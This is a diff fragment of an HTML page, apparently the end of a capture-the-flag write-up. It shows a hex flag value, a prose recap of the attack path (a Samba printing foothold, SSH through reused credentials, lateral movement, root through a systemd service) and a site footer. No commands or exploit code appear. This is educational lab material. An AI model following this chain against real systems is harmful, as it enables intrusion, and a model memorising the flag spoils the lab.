+</span></span><span style="display:flex;"><span>bb2ebf7e1fea768b5b5c5f9cea65303b</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h2 id="takeaways" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>TAKEAWAYS</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>This machine made me realize how fast a small misconfiguration can evolve into something much greater. To get root access after starting from nothing but a Samba printing subsystem shows how unsecure code sanitization can quite literally turn an <em>inch</em> into a <em>mile</em>. A simple printer share was enough to get a foothold on the machine!<br>
+ <br>
+Thanks to reused credentials, I was able to ssh as <strong>scott</strong> (a good reminder to never reuse passwords). It was also a lot of fun performing lateral movement to the <strong>marcus</strong> user and gaining root access through a systemd service. All in all, this box was very educational and fun to hack.</p>
+
+        </div>
+      </div>
+
+      
+    </article>
+
+    <div class="hidden lg:block col-span-2"></div>
+  </div>
+</main>
+
+      </div>
+
+    </div>
+  </main>
+
+  <footer>
+    <div class="border-t border-gray-800 bg-[#070709] text-gray-400">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6">
+    <div class="flex flex-col md:flex-row items-center justify-between py-6 space-y-4 md:space-y-0">
+
+      
+      <div class="text-sm sm:text-base md:text-lg">
+        <span class="relative inline-block">
+          © 2026 Esteban Pangelinan. All rights reserved. <br>
+          Made with <a href="https://gohugo.io" target="_blank">Hugo</a> | <a
+            href="https://github.com/Enerhim/enervoid-theme" target="_blank">Enervoid</a>
+        </span>
+      </div>
+
+      
+      <div class="flex items-center space-x-6 text-sm sm:text-base md:text-lg">
+
+        
+        <a href='https://github.com/est706' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-github-original"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+        <a href='https://www.linkedin.com/in/esteban-pangelinan-385249210/' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-linkedin-plain"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+
+      </div>
+    </div>
+  </div>
+</div>
+
+  </footer>
+</body>
+
+</html>
